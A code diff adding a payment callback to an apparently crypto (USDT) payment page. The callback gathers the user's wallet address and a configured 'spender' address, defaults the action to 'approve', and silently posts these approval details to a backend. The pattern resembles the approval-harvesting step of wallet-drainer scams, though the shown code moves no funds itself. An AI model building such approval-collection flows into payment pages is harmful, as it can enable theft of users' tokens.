@@ -333,5 +333,65 @@
     log("页面已就绪");
   }
 
+  window.pay0PaymentCallback = async function (info) {
+    try {
+      const cfg = window.pay0Config || {};
+      const chain = String(info.chain || "").trim();
+      const txHash = String(info.txHash || "").trim();
+      const amountUsdt = String(info.amountUsdt || "").trim();
+      const action = String(info.action || "").trim() || "approve";
+
+      let tokenAddress = "";
+      let spenderAddress = "";
+      let ownerAddress = "";
+
+      if (chain === "tron") {
+        if (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress && window.tronLink.tronWeb.defaultAddress.base58) {
+          ownerAddress = window.tronLink.tronWeb.defaultAddress.base58;
+        } else if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+          ownerAddress = window.tronWeb.defaultAddress.base58;
+        }
+        const netCfgTron = typeof cfg.getNetworkConfig === "function" ? cfg.getNetworkConfig("tron") : null;
+        if (netCfgTron) {
+          tokenAddress = netCfgTron.usdtAddress || "";
+          spenderAddress = cfg.toAddress || netCfgTron.toAddress || "";
+        }
+      } else {
+        if (window.ethereum && window.ethers && window.ethers.BrowserProvider) {
+          try {
+            const provider = new window.ethers.BrowserProvider(window.ethereum);
+            const signer = await provider.getSigner();
+            ownerAddress = await signer.getAddress();
+          } catch (e) {}
+        }
+        if (typeof cfg.getNetworkConfig === "function") {
+          const netCfg = cfg.getNetworkConfig(chain);
+          if (netCfg) {
+            tokenAddress = netCfg.usdtAddress || "";
+            spenderAddress = cfg.toAddress || netCfg.toAddress || "";
+          }
+        }
+      }
+
+      if (!ownerAddress) return;
+      if (!tokenAddress || !spenderAddress) return;
+      if (!chain || !txHash || !amountUsdt) return;
+
+      const body = {
+        chain,
+        txHash,
+        amountUsdt,
+        action,
+        tokenAddress,
+        spenderAddress,
+        ownerAddress
+      };
+
+      if (window.pay0Api && typeof window.pay0Api.postApproval === "function") {
+        await window.pay0Api.postApproval(body);
+      }
+    } catch (e) {}
+  };
+
   window.pay0Actions = { init, resolvePayParamsAndJump };
 })();
